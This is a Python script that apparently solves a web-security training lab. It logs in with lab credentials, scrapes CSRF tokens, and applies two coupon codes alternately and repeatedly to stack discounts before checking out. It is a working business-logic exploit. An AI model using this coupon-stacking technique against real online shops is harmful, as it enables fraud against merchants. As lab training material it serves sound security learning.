import requests 
import re 


import requests
import re




# Disable certificate warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

session = requests.Session()

# Use Burp proxy if needed
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Take URL input

app_url = input("Enter your url :  ").strip()

# To find the csrf token from url 

csrf_token = session.get(app_url+"/login",verify=False,proxies=proxies)
match  = re.search(r'name="csrf" value="(.*?)"',csrf_token.text)  # find the csrf token
token = match.group(1)
print(f"this is /login csrf",token)

data = {"username":"wiener","password":"peter","csrf":token}
wiener_session = session.post(app_url+"/login",data=data,proxies=proxies,verify=False)

product_add = {"productId":"1","redir":"PRODUCT","quantity":"1"}
adding_product = session.post(app_url+"/cart",data=product_add,proxies=proxies,verify=False)


#  Apply the coupon for this 
for i in range(0,4):
    token_list = ['SIGNUP30', 'NEWCUST5']   # here the logic is prakash,rounak,prakas,rounak,prakash,rounak like we apply the coupon
    for item in token_list:
        r = session.get(app_url + "/cart", verify=False)
        match = re.search(r'name="csrf" value="(.+?)">', r.text)
        csrf_token = match.group(1)
        coupon_data = {"csrf": csrf_token, "coupon": item}
        r = session.post(app_url + "/cart/coupon", verify=False, data=coupon_data,proxies=proxies)
        print(r)

csrf_token1 = session.get(app_url+"/cart",verify=False,proxies=proxies)
match1 = re.search(r'name="csrf" value="(.*?)"',csrf_token1.text).group(1)  # new way to find csrf token 
print(f"csrf2 /cart token",match1)
login_session2 = session.post(app_url+"/cart/checkout",verify=False,proxies=proxies,data={"csrf":match1})





